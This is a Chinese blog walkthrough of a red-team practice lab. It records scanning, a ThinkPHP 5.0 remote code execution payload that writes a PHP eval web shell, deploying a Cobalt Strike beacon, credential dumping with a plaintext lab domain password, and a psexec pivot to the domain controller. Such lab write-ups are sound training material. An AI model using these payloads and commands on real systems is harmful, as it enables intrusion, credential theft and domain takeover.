-<h4 id="相对于红队靶机一感觉简单了许多-可能是套路一样做了一遍的原因"><a href="#相对于红队靶机一感觉简单了许多-可能是套路一样做了一遍的原因" class="headerlink" title="相对于红队靶机一感觉简单了许多,可能是套路一样做了一遍的原因"></a>相对于红队靶机一感觉简单了许多,可能是套路一样做了一遍的原因</h4><h5 id="前渗透"><a href="#前渗透" class="headerlink" title="前渗透"></a>前渗透</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.0.0/24  //探测存活主机</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/1.png" class="">
-
-<p>192.168.0.162便是我们把靶机ip</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -sV -sT 192.168.0.162 //对目标靶机进行端口扫描查看开启的服务</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-27 21:31 CST</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.0.162</span><br><span class="line">Host is up (0.0098s latency).</span><br><span class="line">Not shown: 992 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="line">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: SUN)</span><br><span class="line">3306/tcp  open  mysql        MySQL (unauthorized)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:B9:F4:45 (VMware)</span><br><span class="line">Device type: general purpose|media device</span><br><span class="line">Running: Microsoft Windows 2008|10|7|8.1, Microsoft embedded</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_10 cpe:/h:microsoft:xbox_one cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows Server 2008 SP2, Microsoft Windows Server 2008 SP2 or Windows 10 or Xbox One, Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: WIN7; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: WIN7, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b9:f4:45 (VMware)</span><br><span class="line">|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: -1s</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: win7</span><br><span class="line">|   NetBIOS computer name: WIN7\x00</span><br><span class="line">|   Domain name: sun.com</span><br><span class="line">|   Forest name: sun.com</span><br><span class="line">|   FQDN: win7.sun.com</span><br><span class="line">|_  System time: 2021-12-27T21:32:33+08:00</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-12-27T13:32:33</span><br><span class="line">|_  start_date: 2021-12-24T10:19:01</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   9.84 ms 192.168.0.162</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 68.16 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>3306一般是mysql数据库对应的服务端口</p>
-<p>尝试远程连接一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h192.168.0.162 -uroot -p </span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/2.png" class="">
-
-<p>但是目标靶机数据库貌似禁用了远程连接</p>
-<p>上面看到目标靶机还开放了80端口http服务,通过浏览器访问一下.</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/3.png" class="">
-
-<p>是一个thinkphp框架,通过报错查看对应的版本.</p>
-<p>发现是<a href="http://www.thinkphp.cn/">ThinkPHP</a> V5.0.22</p>
-<p>网上有很多poc随便找一个尝试利用  ThinkPhp5.0任意代码执行：<a href="https://www.cnblogs.com/backlion/p/10106676.html">https://www.cnblogs.com/backlion/p/10106676.html</a></p>
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ttp://192.168.0.162/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_GET[&quot;xiaobao&quot;]);?^&gt;&gt;shell.php</span><br></pre></td></tr></table></figure>
-
-<p>通过蚁剑尝试连接</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/4.png" class="">
-
-<p>连接成功</p>
-<p>通过蚁剑的虚拟终端查看当前权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/5.png" class="">
-
-<p>直接是管理员权限.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all 查看是否有域</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/7.png" class="">
-
-<p>发现存在名字为sun的域</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist //查看是否有杀毒软件</span><br></pre></td></tr></table></figure>
-
-<p>发现并没有杀毒软件</p>
-<p>这里准备cs生成一个木马把靶机上线到cs进行后渗透</p>
-<h5 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./teamserver 192.168.0.153 123456 //开启cs服务器</span><br></pre></td></tr></table></figure>
-
-<p>客户端进行连接</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/8.png" class="">
-
-<p>开启一个监听并生成木马muma.exe</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/9.png" class="">
-
-<p>通过蚁剑上传到靶机对应的目录中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;muma.exe&quot; dir=in action=allow program=&quot;C:\phpStudy\WWW\muma.exe&quot; enable=yes //设置防火墙默认允许</span><br></pre></td></tr></table></figure>
-
-<p>运行木马</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">muma.exe</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/10.png" class="">
-
-<p>上线成功</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell net time /domain //查看域控</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/11.png" class="">
-
-<p>通过ping域控名字查看其IP地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell ping DC.sun.com</span><br><span class="line">[*] Tasked beacon to run: ping DC.sun.com</span><br><span class="line">[+] host called home, sent: 106 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">正在 Ping DC.sun.com [192.168.138.138] 具有 32 字节的数据:</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; net view //查看域内主机</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/12.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords //查看计算机内的用户密码</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/13.png" class="">
-
-<p>得到了目标的密码,直接通过cs中psexec模块进行票据传递攻击</p>
-<p>先开启一个SMB服务的监听</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/14.png" class="">
-
-<p>对域控进行psexec攻击</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/15.png" class="">
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/16.png" class="">
-
-<p>同样也可以通过命令行进行传递攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">beacon&gt; make_token SUN\Administrator hongrisec@2019</span><br><span class="line">beacon&gt; jump psexec DC 域控</span><br><span class="line">[+] host called home, sent: 58 bytes</span><br><span class="line">[+] Impersonated NT AUTHORITY\SYSTEM</span><br><span class="line">[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_2835) on DC via Service Control Manager (\\DC\ADMIN$\79a9e06.exe)</span><br><span class="line">[+] host called home, sent: 285790 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Started service 79a9e06 on DC</span><br><span class="line">[+] host called home, sent: 74 bytes</span><br><span class="line">[+] established link to child beacon: 192.168.138.138</span><br></pre></td></tr></table></figure>
-
-<p>最后域控也成功上线</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/17.png" class="">
-
-<h5 id="成功通关"><a href="#成功通关" class="headerlink" title="成功通关!"></a>成功通关!</h5>]]></content>
-      <categories>
-        <category>内网学习</category>
-      </categories>
-      <tags>
-        <tag>内网</tag>
-        <tag>thinkphp模板</tag>
       </tags>
   </entry>
 </search>
